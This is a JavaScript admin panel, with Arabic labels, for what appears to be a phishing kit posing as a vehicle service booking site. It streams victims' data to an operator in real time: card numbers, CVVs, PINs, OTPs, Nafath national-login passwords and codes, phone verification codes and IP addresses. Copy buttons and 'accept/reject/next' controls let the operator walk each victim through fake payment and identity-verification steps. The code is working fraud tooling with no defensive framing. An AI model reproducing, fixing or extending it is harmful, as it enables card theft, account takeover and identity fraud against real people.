<script>
  let authToken = localStorage.getItem('adminToken');
  let socket = null;
  let bookingsData = [];
  let currentBooking = null;
  const API_BASE = window.location.origin;

  // ==================== Auth ====================
  async function login() {
    const password = document.getElementById('passwordInput').value;
    if (!password) return;
    try {
      const res = await fetch(`${API_BASE}/api/admin/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password }),
      });
      const data = await res.json();
      if (data.success) {
        authToken = data.token;
        localStorage.setItem('adminToken', authToken);
        showDashboard();
      } else {
        document.getElementById('loginError').textContent = data.error || 'كلمة المرور غير صحيحة';
        document.getElementById('loginError').classList.remove('d-none');
      }
    } catch (err) {
      document.getElementById('loginError').textContent = 'خطأ في الاتصال بالخادم';
      document.getElementById('loginError').classList.remove('d-none');
    }
  }

  function logout() {
    localStorage.removeItem('adminToken');
    authToken = null;
    if (socket) socket.disconnect();
    document.getElementById('dashboardSection').style.display = 'none';
    document.getElementById('loginSection').style.display = 'block';
  }

  function togglePassword() {
    const input = document.getElementById('passwordInput');
    const icon = document.getElementById('eyeIcon');
    if (input.type === 'password') {
      input.type = 'text';
      icon.className = 'bi bi-eye-slash';
    } else {
      input.type = 'password';
      icon.className = 'bi bi-eye';
    }
  }

  document.getElementById('passwordInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') login();
  });

  // ==================== Dashboard ====================
  function showDashboard() {
    document.getElementById('loginSection').style.display = 'none';
    document.getElementById('dashboardSection').style.display = 'block';
    document.getElementById('siteUrl').textContent = `${API_BASE}/site`;
    document.getElementById('adminUrl').textContent = `${API_BASE}/admin`;
    initSocket();
    loadStats();
    loadBookings();
  }

  function showSection(name) {
    document.querySelectorAll('[id^="section"]').forEach(el => el.style.display = 'none');
    document.getElementById(`section${name.charAt(0).toUpperCase() + name.slice(1)}`).style.display = 'block';
    document.querySelectorAll('.nav-link').forEach(el => el.classList.remove('active'));
    event.target.closest('.nav-link').classList.add('active');
    if (name === 'bookings') loadBookings();
    if (name === 'dashboard') loadStats();
  }

  // ==================== Socket.io ====================
  function initSocket() {
    socket = io(API_BASE, { transports: ['websocket', 'polling'] });
    socket.on('connect', () => {
      socket.emit('joinAdmin', { token: authToken });
      document.getElementById('socketStatus').innerHTML = '<span class="connected-dot"></span>متصل';
    });
    socket.on('disconnect', () => {
      document.getElementById('socketStatus').innerHTML = '<span class="disconnected-dot"></span>غير متصل';
    });
    socket.on('newBooking', (data) => {
      playAlert();
      showNotification('حجز جديد', `مرجع: ${data.reference}`, 'info');
      loadBookings();
      loadStats();
    });
    socket.on('newPayment', (data) => {
      playAlert();
      const typeNames = { payment: 'بيانات بطاقة', otp: 'رمز OTP', code: 'رمز PIN', nafath: 'بيانات نفاذ', motasel: 'بيانات المتصل', rajhi: 'بيانات الراجحي' };
      showNotification('بيانات جديدة', `${typeNames[data.type] || 'بيانات'} - ${data.reference}`, 'warning');
      loadBookings();
      if (currentBooking === data.reference) openBookingDetail(data.reference);
    });
    socket.on('paymentActionSet', (data) => {
      loadBookings();
    });
  }

  // ==================== Stats ====================
  async function loadStats() {
    try {
      const res = await fetch(`${API_BASE}/api/admin/stats`, {
        headers: { 'Authorization': `Bearer ${authToken}` },
      });
      const data = await res.json();
      if (data.success) {
        document.getElementById('statTotal').textContent = data.data.total;
        document.getElementById('statNew').textContent = data.data.new;
        document.getElementById('statCompleted').textContent = data.data.completed;
        document.getElementById('statPending').textContent = data.data.total - data.data.completed - data.data.new;
      }
    } catch (err) {}
  }

  // ==================== Bookings ====================
  async function loadBookings() {
    try {
      const res = await fetch(`${API_BASE}/api/admin/bookings`, {
        headers: { 'Authorization': `Bearer ${authToken}` },
      });
      const data = await res.json();
      if (data.success) {
        bookingsData = data.data;
        renderBookings(bookingsData);
        renderRecentBookings(bookingsData.slice(0, 5));
        const newCount = bookingsData.filter(b => b.statusRead === 0).length;
        const badge = document.getElementById('newBadge');
        if (newCount > 0) {
          badge.textContent = newCount;
          badge.classList.remove('d-none');
        } else {
          badge.classList.add('d-none');
        }
      }
    } catch (err) {
      document.getElementById('bookingsList').innerHTML = '<tr><td colspan="7" class="text-center text-danger py-4">خطأ في تحميل البيانات</td></tr>';
    }
  }

  function renderBookings(bookings) {
    const tbody = document.getElementById('bookingsList');
    if (!bookings.length) {
      tbody.innerHTML = '<tr><td colspan="7" class="text-center text-muted py-4">لا توجد حجوزات</td></tr>';
      return;
    }
    tbody.innerHTML = bookings.map(b => `
      <tr class="booking-row" onclick="openBookingDetail('${b.referenceId}')">
        <td><code class="text-info">${b.referenceId}</code> ${b.statusRead === 0 ? '<span class="badge bg-danger ms-1">جديد</span>' : ''}</td>
        <td>${b.clientName || '-'}</td>
        <td>${b.clientPhone || '-'}</td>
        <td>${b.serviceType || '-'}</td>
        <td>${b.serviceDate || '-'}</td>
        <td>${getStatusBadge(b.status)}</td>
        <td>
          <button class="btn btn-sm btn-outline-info" onclick="event.stopPropagation(); openBookingDetail('${b.referenceId}')">
            <i class="bi bi-eye"></i>
          </button>
        </td>
      </tr>
    `).join('');
  }

  function renderRecentBookings(bookings) {
    const el = document.getElementById('recentBookings');
    if (!bookings.length) {
      el.innerHTML = '<p class="text-muted text-center">لا توجد حجوزات حتى الآن</p>';
      return;
    }
    el.innerHTML = bookings.map(b => `
      <div class="d-flex justify-content-between align-items-center py-2 border-bottom border-secondary">
        <div>
          <span class="text-white">${b.clientName || 'غير محدد'}</span>
          <small class="text-muted me-2">${b.referenceId}</small>
        </div>
        <div>${getStatusBadge(b.status)}</div>
      </div>
    `).join('');
  }

  function getStatusBadge(status) {
    const map = {
      'new': '<span class="badge bg-primary">جديد</span>',
      'pending_payment': '<span class="badge bg-warning text-dark">انتظار دفع</span>',
      'pending_nafath': '<span class="badge bg-info">انتظار نفاذ</span>',
      'pending_motasel': '<span class="badge bg-secondary">انتظار متصل</span>',
      'payment_done': '<span class="badge bg-success">تم الدفع</span>',
      'completed': '<span class="badge bg-success">مكتمل</span>',
      'cancelled': '<span class="badge bg-danger">ملغي</span>',
    };
    return map[status] || `<span class="badge bg-secondary">${status || 'غير محدد'}</span>`;
  }

  // ==================== Booking Detail ====================
  async function openBookingDetail(reference) {
    currentBooking = reference;
    const modal = new bootstrap.Modal(document.getElementById('bookingModal'));
    document.getElementById('modalTitle').textContent = `تفاصيل الحجز - ${reference}`;
    document.getElementById('modalBody').innerHTML = '<div class="text-center py-4 text-muted">جاري التحميل...</div>';
    modal.show();
    try {
      const res = await fetch(`${API_BASE}/api/admin/bookings/${reference}`, {
        headers: { 'Authorization': `Bearer ${authToken}` },
      });
      const data = await res.json();
      if (data.success) renderBookingDetail(data.data);
    } catch (err) {
      document.getElementById('modalBody').innerHTML = '<div class="text-center py-4 text-danger">خطأ في تحميل البيانات</div>';
    }
  }

  function renderBookingDetail(booking) {
    const p = booking.payment;
    const n = booking.nafath;
    const m = booking.motasel;
    const o = booking.otp;
    const copyBtn = (text) => `<button class="copy-btn" onclick="copyText('${text}')" title="نسخ"><i class="bi bi-copy"></i></button>`;
    document.getElementById('modalBody').innerHTML = `
      <div class="row g-3">
        <!-- بيانات الحجز -->
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-info mb-3"><i class="bi bi-person me-2"></i>بيانات العميل</h6>
            ${row('الاسم', booking.clientName)}
            ${row('رقم الهوية', booking.clientId)}
            ${row('الهاتف', booking.clientPhone)}
            ${row('البريد', booking.clientEmail)}
            ${row('الجنسية', booking.clientNationality)}
            ${row('IP العميل', booking.clientIp)}
          </div>
        </div>
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-info mb-3"><i class="bi bi-car-front me-2"></i>بيانات المركبة</h6>
            ${row('رقم اللوحة', booking.vehiclePlate)}
            ${row('نوع المركبة', booking.vehicleType)}
            ${row('دولة التسجيل', booking.vehicleCountry)}
            ${row('نوع الخدمة', booking.serviceType)}
            ${row('المنطقة', booking.serviceRegion)}
            ${row('التاريخ', booking.serviceDate + ' ' + booking.serviceTime)}
          </div>
        </div>
        ${booking.hasDelegate ? `
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-warning mb-3"><i class="bi bi-person-badge me-2"></i>بيانات المندوب</h6>
            ${row('الاسم', booking.delegateName)}
            ${row('الهاتف', booking.delegatePhone)}
            ${row('الهوية', booking.delegateId)}
            ${row('الجنسية', booking.delegateNationality)}
          </div>
        </div>` : ''}
        ${p ? `
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-green-400 mb-3" style="color:#10b981"><i class="bi bi-credit-card me-2"></i>بيانات البطاقة</h6>
            ${rowCopy('اسم حامل البطاقة', p.cardHolderName)}
            ${rowCopy('رقم البطاقة', p.cardNumber)}
            ${rowCopy('تاريخ الانتهاء', p.cardExpiry)}
            ${rowCopy('CVV', p.cardCvv)}
            ${p.secretNum ? rowCopy('الرمز السري / PIN', p.secretNum) : ''}
            ${row('الخطوة', p.step)}
            ${row('الحالة', p.paymentAction || p.status)}
          </div>
        </div>` : ''}
        ${o ? `
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-purple mb-3" style="color:#a78bfa"><i class="bi bi-shield-check me-2"></i>رمز OTP</h6>
            ${rowCopy('رمز OTP', o.otpCode)}
            ${row('الخطوة', o.step)}
          </div>
        </div>` : ''}
        ${n ? `
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-blue mb-3" style="color:#60a5fa"><i class="bi bi-fingerprint me-2"></i>بيانات نفاذ</h6>
            ${rowCopy('رقم الهوية', n.nafathId)}
            ${rowCopy('كلمة المرور', n.nafathPassword)}
            ${n.nafathNumber ? rowCopy('رمز نفاذ', n.nafathNumber) : ''}
          </div>
        </div>` : ''}
        ${m ? `
        <div class="col-md-6">
          <div class="card-dark p-3">
            <h6 class="text-orange mb-3" style="color:#fb923c"><i class="bi bi-phone me-2"></i>بيانات المتصل</h6>
            ${row('المزود', m.motaselProvider)}
            ${rowCopy('الهاتف', m.motaselPhone)}
            ${m.motaselCode ? rowCopy('الرمز', m.motaselCode) : ''}
          </div>
        </div>` : ''}
        <!-- أزرار الإجراءات -->
        <div class="col-12">
          <div class="card-dark p-3">
            <h6 class="text-white mb-3"><i class="bi bi-lightning me-2"></i>الإجراءات</h6>
            <div class="d-flex gap-2 flex-wrap">
              <button class="btn btn-accept" onclick="paymentAction('${booking.referenceId}', 'pass')">
                <i class="bi bi-check-lg me-1"></i>قبول / التالي
              </button>
              <button class="btn btn-reject" onclick="paymentAction('${booking.referenceId}', 'denied')">
                <i class="bi bi-x-lg me-1"></i>رفض
              </button>
              ${n ? `
              <div class="input-group" style="max-width:250px;">
                <input type="text" id="nafathCodeInput" class="form-control bg-dark text-white border-secondary" placeholder="رمز نفاذ" />
                <button class="btn btn-outline-info" onclick="sendNafathCode('${booking.referenceId}')">إرسال رمز نفاذ</button>
              </div>` : ''}
              <button class="btn btn-outline-success" onclick="paymentAction('${booking.referenceId}', 'completed')">
                <i class="bi bi-check-all me-1"></i>إتمام الحجز
              </button>
            </div>
          </div>
        </div>
      </div>
    `;
  }

  function row(label, value) {
    return `<div class="detail-row"><span class="detail-label">${label}</span><span class="detail-value">${value || '-'}</span></div>`;
  }

  function rowCopy(label, value) {
    if (!value) return row(label, '-');
    return `<div class="detail-row">
      <span class="detail-label">${label}</span>
      <span class="detail-value">
        ${value}
        <button class="copy-btn" onclick="copyText('${value}')" title="نسخ"><i class="bi bi-copy"></i></button>
      </span>
    </div>`;
  }

  async function paymentAction(reference, action) {
    try {
      const res = await fetch(`${API_BASE}/api/admin/payment-action`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({ reference, action }),
      });
      const data = await res.json();
      if (data.success) {
        showNotification('تم', `تم تنفيذ الإجراء: ${action} → ${data.targetPage || ''}`, 'success');
        loadBookings();
        if (currentBooking === reference) openBookingDetail(reference);
      } else {
        showNotification('خطأ', data.error || 'حدث خطأ', 'danger');
      }
    } catch (err) {
      showNotification('خطأ', 'فشل الاتصال بالخادم', 'danger');
    }
  }

  async function sendNafathCode(reference) {
    const code = document.getElementById('nafathCodeInput')?.value;
    if (!code) return;
    try {
      const res = await fetch(`${API_BASE}/api/admin/send-nafath-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
        body: JSON.stringify({ reference, code }),
      });
      const data = await res.json();
      if (data.success) showNotification('تم', 'تم إرسال رمز نفاذ', 'success');
    } catch (err) {}
  }

  // ==================== Utilities ====================
  function copyText(text) {
    navigator.clipboard.writeText(text).then(() => {
      showNotification('تم النسخ', text, 'success');
    });
  }

  function showNotification(title, message, type) {
    const id = 'notif_' + Date.now();
    const colors = { info: '#3b82f6', success: '#10b981', warning: '#f59e0b', danger: '#ef4444' };
    const el = document.createElement('div');
    el.id = id;
    el.className = 'alert alert-dismissible fade show';
    el.style.cssText = `background:${colors[type] || '#3b82f6'}; color:white; border:none; border-radius:10px; margin-bottom:10px;`;
    el.innerHTML = `<strong>${title}</strong><br><small>${message}</small><button type="button" class="btn-close btn-close-white" onclick="document.getElementById('${id}').remove()"></button>`;
    document.getElementById('notificationContainer').appendChild(el);
    setTimeout(() => { try { el.remove(); } catch(e) {} }, 5000);
  }

  function playAlert() {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.frequency.setValueAtTime(880, ctx.currentTime);
      osc.frequency.setValueAtTime(660, ctx.currentTime + 0.1);
      gain.gain.setValueAtTime(0.3, ctx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
      osc.start(ctx.currentTime);
      osc.stop(ctx.currentTime + 0.3);
    } catch (e) {}
  }

  // ==================== Init ====================
  if (authToken) {
    // التحقق من صحة التوكن
    fetch(`${API_BASE}/api/admin/me`, { headers: { 'Authorization': `Bearer ${authToken}` } })
      .then(r => r.json())
      .then(d => { if (d.success) showDashboard(); else { localStorage.removeItem('adminToken'); } })
      .catch(() => {});
  }
